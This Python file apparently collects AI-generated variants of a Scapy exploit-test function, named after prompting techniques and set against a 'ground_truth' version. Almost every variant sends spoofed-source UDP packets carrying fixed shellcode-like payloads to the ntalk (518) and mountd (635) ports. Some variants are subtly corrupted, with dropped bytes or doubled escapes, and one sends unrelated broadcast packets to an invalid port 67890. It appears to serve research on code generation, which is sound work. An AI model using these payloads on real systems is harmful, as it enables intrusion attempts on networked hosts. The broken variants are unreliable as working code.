import socket
from scapy.all import *
from scapy.all import IP, UDP, send, sendp, Raw, RandShort
from scapy.layers.l2 import Ether
from ipaddress import ip_address

def ground_truth_code_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)

def persona_exploitTest(src, dst, iface, count): 
    from scapy.all import IP, UDP, Raw, send
    pkt = IP(src=src, dst=dst, ttl=40)/UDP(dport=518)/Raw(b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count, verbose=0)
    pkt = IP(src=src, dst=dst, ttl=40)/UDP(dport=635)/Raw(b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count, verbose=0)

def template_exploitTest(src, dst, iface, count):
	from scapy.all import IP, UDP, Raw, send
	error = None
	if count < 1:
		raise ValueError('Invalid count value')
	try:
		for _ in range(count):
			pkt1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
			send(pkt1, iface=iface, verbose=0)
			pkt2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
			send(pkt2, iface=iface, verbose=0)
	except Exception as e:
		raise Exception(f'Failed to send packet: {e}')


from scapy.all import Ether, IP, UDP, sendp, Raw
def question_refinement_exploitTest():
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst="192.168.1.100")/UDP(dport=12345)/Raw(b'payload'),
        iface="eth0",
        verbose=0
    )
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/IP(dst="192.168.1.101")/UDP(dport=67890)/Raw(b'payload'),
        iface="eth0",
        verbose=0
    )



def alternative_approaches_exploitTest(src, dst, iface, count):
    from scapy.all import IP, UDP, Raw, send
    for i in range(count):
        try:
            packet518 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
            send(packet518, verbose=0, iface=iface)
            packet635 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load="^\\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
            send(packet635, verbose=0, iface=iface)
        except Exception as e:
            print(f"An error occurred: {e}")

def context_manager_exploitTest(src, dst, iface, count):
	for _ in range(count):
		pkt1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
		send(pkt1, iface=iface)
		pkt2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
		send(pkt2, iface=iface)
          
def flipped_interaction_3__exploitTest(src, dst, iface, count):
    from scapy.all import UDP, IP, Raw
    payload1 = b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8'
    payload2 = b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F'
    packet1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(payload1)
    packet2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(payload2)
    for i in range(count):
        send(packet1, iface=iface, verbose=False)
        send(packet2, iface=iface, verbose=False)

        
def flipped_interaction_4__exploitTest(src, dst, iface, count):
    packet1 = IP(src=src, dst=dst)/UDP(sport=123, dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    packet2 = IP(src=src, dst=dst)/UDP(sport=123, dport=635)/Raw(load=b'^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(packet1, iface=iface, count=count)
    send(packet2, iface=iface, count=count)
    
def flipped_interaction_5__exploitTest(src, dst, iface, count):
	for _ in range(count):
		pkt1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
		pkt2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
		send(pkt1, iface=iface, verbose=0)
		send(pkt2, iface=iface, verbose=0)
            
def iterative_prompting_3__exploitTest(src, dst, iface, count):
    if not isinstance(count, int) or count < 1:
        raise ValueError('Count must be a positive integer')
    if not isinstance(src, str) or not isinstance(dst, str):
        raise ValueError('Source and destination IP addresses must be strings')
    if not isinstance(iface, str):
        raise ValueError('Interface name must be a string')
    try:
        for i in range(count):
            if (518 < 1) or (518 > 65535) or (635 < 1) or (635 > 65535):
                raise ValueError('Invalid UDP ports')
            if len(b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8') > 65535:
                raise ValueError('Raw payload length exceeded')
            if len(b'^\\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F') > 65535:
                raise ValueError('Raw payload length exceeded')
            pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
            send(pkt, verbose=False, iface=iface)
            pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b'^\\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
            send(pkt, verbose=False, iface=iface)
    except (socket.error, OSError, Exception) as e:
        print(f'Error: {str(e)}')
        
def iterative_prompting_4__exploitTest(src: str, dst: str, iface: str, count: int) -> None:
	if not (isinstance(src, str) and isinstance(dst, str) and isinstance(iface, str) and isinstance(count, int)):
		raise TypeError("Invalid input type")
	if count == 0:
		raise ValueError("Count must be a positive integer")
	try:
		import importlib.util
		scapy_spec = importlib.util.find_spec('scapy.all')
		if scapy_spec is None:
			raise ImportError("Scapy library not found")
	except ImportError as e:
		raise ImportError("Failed to import Scapy library: {}".format(e))
	try:
		for _ in range(count):
			pkt = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
			send(pkt, iface=iface, verbose=False)
			pkt = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b'\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
			send(pkt, iface=iface, verbose=False)
	except Exception as e:
		raise RuntimeError("Failed to send packets: {}".format(e))
      
def iterative_prompting_5__exploitTest(src, dst, iface, count):
    if not isinstance(src, str) or not isinstance(dst, str) or not isinstance(iface, str) or not isinstance(count, int):
        raise TypeError('Invalid input type')
    try:
        src_ip = ip_address(src)
        dst_ip = ip_address(dst)
        if src_ip.is_private or dst_ip.is_private:
            raise ValueError('Private IP address is not allowed')
    except ValueError:
        return
    if count <= 0:
        return
    try:
        pkt1 = IP(src=str(src_ip), dst=str(dst_ip))/UDP(dport=518)/Raw(load=b'\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
        pkt2 = IP(src=str(src_ip), dst=str(dst_ip))/UDP(dport=635)/Raw(load=b'\x5E\xB0\x02\x89\x06\xFE\xC8\x89\x46\x04\xB0\x06\x89\x46')
        send(pkt1, iface=iface, count=count, verbose=False)
        send(pkt2, iface=iface, count=count, verbose=False)
    except Exception as e:
        pass
    
def few_shots_prompting_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(pkt, iface=iface, count=count)
    
def cot_prompting_exploitTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load='\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8')
    send(pkt)
    pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load='^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F')
    send(pkt, iface=iface, count=count)
    
def fact_check_list_exploitTest(src, dst, iface, count):
    try:
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        for _ in range(count):
            send(pkt1, iface=iface)
            send(pkt2, iface=iface)
    except Exception as e:
        print(f"Error sending packets: {str(e)}")
       
def not_interactive_mix_exploitTest(src, dst, iface, count):
    try:
        from scapy.all import IP, UDP, Raw, send
    except ImportError:
        raise ImportError("Scapy library is required to run this function.")
    if not isinstance(src, str) or not isinstance(dst, str):
        raise TypeError("Source and destination IP addresses must be strings.")
    if not isinstance(iface, str):
        raise TypeError("Interface name must be a string.")
    if not isinstance(count, int) or count <= 0:
        raise TypeError("Packet count must be a positive integer.")
    try:
        pkt = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        send(pkt, iface=iface, count=count, verbose=False)
        pkt = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(pkt, iface=iface, count=count, verbose=False)
    except Exception as e:
        raise Exception(f"Failed to send packets: {{e}}")
    
import logging
from scapy.all import *
logging.basicConfig(level=logging.INFO)
def interactive_mix_exploitTest(src, dst, iface, count):
    try:
        IP(src)
        IP(dst)
    except ValueError:
        logging.error("Invalid source or destination IP address")
        return
    try:
        pkt1 = IP(src=src, dst=dst) / UDP(dport=518) / Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
        send(pkt1, iface=iface, count=count, verbose=False)
        logging.info(f"Sent {count} packets to {dst}:518")
    except Exception as e:
        logging.error(f"Error sending packet to {dst}:518: {e}")
    try:
        pkt2 = IP(src=src, dst=dst) / UDP(dport=635) / Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
        send(pkt2, iface=iface, count=count, verbose=False)
        logging.info(f"Sent {count} packets to {dst}:635")
    except Exception as e:
        logging.error(f"Error sending packet to {dst}:635: {e}")
        
def baseline_mix_exploitTest(src, dst, iface, count):
    from scapy.all import IP, UDP, send
    packet1 = IP(src=src, dst=dst)/UDP(dport=518)/Raw(load=b"\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    packet2 = IP(src=src, dst=dst)/UDP(dport=635)/Raw(load=b"^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(packet1, iface=iface, count=count)
    send(packet2, iface=iface, count=count)

